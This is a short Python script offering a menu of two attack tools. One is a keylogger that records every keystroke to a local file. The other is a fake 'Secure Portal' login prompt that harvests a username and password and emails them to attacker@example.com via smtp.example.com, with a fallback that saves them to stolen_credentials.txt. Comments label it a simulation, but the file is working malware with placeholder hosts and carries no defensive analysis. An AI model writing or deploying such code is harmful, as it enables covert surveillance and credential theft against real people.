import keyboard
import smtplib
from email.mime.text import MIMEText
import getpass
import os

# Keylogger example
def keylogger():
    log_file = "keystrokes.txt"
    def on_key_press(event):
        with open(log_file, "a") as f:
            f.write(event.name)
            if event.name == "enter":
                f.write("\n")
    
    keyboard.on_press(on_key_press)
    keyboard.wait("esc")  # Stops when ESC is pressed

# Phishing simulation (fake login prompt)
def phishing_simulation():
    print("Welcome to Secure Portal")
    username = input("Enter username: ")
    password = getpass.getpass("Enter password: ")
    
    # Simulate sending credentials to attacker
    send_credentials(username, password)
    
    return username, password

# Simulate sending stolen credentials
def send_credentials(username, password):
    try:
        sender = "attacker@example.com"
        receiver = "attacker@example.com"
        msg = MIMEText(f"Username: {username}\nPassword: {password}")
        msg["Subject"] = "Stolen Credentials"
        msg["From"] = sender
        msg["To"] = receiver
        
        # Simulated email server (not functional without real SMTP server)
        with smtplib.SMTP("smtp.example.com", 587) as server:
            server.starttls()
            server.login(sender, "attacker_password")
            server.sendmail(sender, receiver, msg.as_string())
    except Exception as e:
        print(f"Error sending credentials: {e}")
        
        # Alternatively, save to file
        with open("stolen_credentials.txt", "a") as f:
            f.write(f"Username: {username}\nPassword: {password}\n")

if __name__ == "__main__":
    print("1. Run keylogger")
    print("2. Run phishing simulation")
    choice = input("Select option (1 or 2): ")
    
    if choice == "1":
        print("Keylogger running. Press ESC to stop.")
        keylogger()
    elif choice == "2":
        username, password = phishing_simulation()
        print("Credentials captured (for demonstration only).")
    else:
        print("Invalid choice.")